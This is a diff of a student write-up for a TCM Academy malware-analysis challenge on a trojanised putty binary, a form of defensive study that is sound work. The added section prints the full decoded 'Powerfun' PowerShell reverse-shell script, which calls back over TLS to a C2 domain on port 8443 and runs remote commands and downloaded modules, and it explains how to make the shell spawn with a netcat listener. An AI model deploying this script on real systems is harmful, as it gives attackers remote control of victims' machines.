@@ -27,6 +27,7 @@ This is the first challenge of the course from TCM Academy called "Practical Mal
 - Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?
 
     **R=** No interesting strings
+  
 - Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?
   
     **R=** Checks for the presence of debuggers with function _IsDebuggerPresent_ \
@@ -68,6 +69,7 @@ This is the first challenge of the course from TCM Academy called "Practical Mal
    4. Reads code from memory
    5. Executes the code
 
+
    I figured that I might be able to decode this using [CyberChef](https://gchq.github.io/CyberChef/),following the same process, I decoded the string using the "From Base64" CyberChef function, and then the "Gunzip" to decompress the data with gzip headers, then I was able to take a peek at the plain-text code.
    
      ![image](https://github.com/user-attachments/assets/cbca011a-ff40-41cf-ae84-38ab384f5302)
@@ -76,15 +78,101 @@ This is the first challenge of the course from TCM Academy called "Practical Mal
 
    ![image](https://github.com/user-attachments/assets/dc7f8b77-61ed-4251-b1cb-d6c7b0744d87)
 
+   Full code:
+  ```
 
 
+# Powerfun - Written by Ben Turner & Dave Hardy
 
+function Get-Webclient 
+{
+    $wc = New-Object -TypeName Net.WebClient
+    $wc.UseDefaultCredentials = $true
+    $wc.Proxy.Credentials = $wc.Credentials
+    $wc
+}
+function powerfun 
+{ 
+    Param( 
+    [String]$Command,
+    [String]$Sslcon,
+    [String]$Download
+    ) 
+    Process {
+    $modules = @()  
+    if ($Command -eq "bind")
+    {
+        $listener = [System.Net.Sockets.TcpListener]8443
+        $listener.start()    
+        $client = $listener.AcceptTcpClient()
+    } 
+    if ($Command -eq "reverse")
+    {
+        $client = New-Object System.Net.Sockets.TCPClient("bonus2.corporatebonusapplication.local",8443)
+    }
 
+    $stream = $client.GetStream()
+
+    if ($Sslcon -eq "true") 
+    {
+        $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
+        $sslStream.AuthenticateAsClient("bonus2.corporatebonusapplication.local") 
+        $stream = $sslStream 
+    }
+
+    [byte[]]$bytes = 0..20000|%{0}
+    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+    $stream.Write($sendbytes,0,$sendbytes.Length)
+
+    if ($Download -eq "true")
+    {
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+        ForEach ($module in $modules)
+        {
+            (Get-Webclient).DownloadString($module)|Invoke-Expression
+        }
+    }
+
+    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+    $stream.Write($sendbytes,0,$sendbytes.Length)
+
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+    {
+        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+        $data = $EncodedText.GetString($bytes,0, $i)
+        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+
+        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
+        $x = ($error[0] | Out-String)
+        $error.clear()
+        $sendback2 = $sendback2 + $x
+
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+        $stream.Write($sendbyte,0,$sendbyte.Length)
+        $stream.Flush()  
+    }
+    $client.Close()
+    $listener.Stop()
+    }
+}
+
+powerfun -Command reverse -Sslcon true
+  ```
  - What is the callback protocol at detonation?
 
-   **R=** TCP
+   **R=** From the packet capture in the loopback interface, we can observe the callback protocol is TLS1.2
 
-   ![image](https://github.com/user-attachments/assets/e31eeef7-a430-4467-94cd-100445918011)
+   ![image](https://github.com/user-attachments/assets/3e58adca-1a44-4b20-b794-bc4b94a1c466)
+
 
  - How can you use host-based telemetry to identify the DNS record, port, and protocol?
+
+   **R=** Filtering by PPID (it being the vaue of putty.exe), we are able to get the protocol (`TCP`), DNS record (`bonus2.corporatebonusapplication.local`) and port (`8443`)
+
+   ![image](https://github.com/user-attachments/assets/f7e04835-7777-441c-a649-9cb03f7259e7)
+
  - Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?
+
+   **R=** It does, a powershell shell. We need to add the domain `bonus2.corporatebonusapplication.local` into our "victim" machine localhosts file, then, within the same machine we open a netcat listener to port 8443 using the `--ssl` flag, as it will not connect to it if there is no successful handshake.
+![image](https://github.com/user-attachments/assets/e124f856-8552-4051-9d01-7622c6308c25)
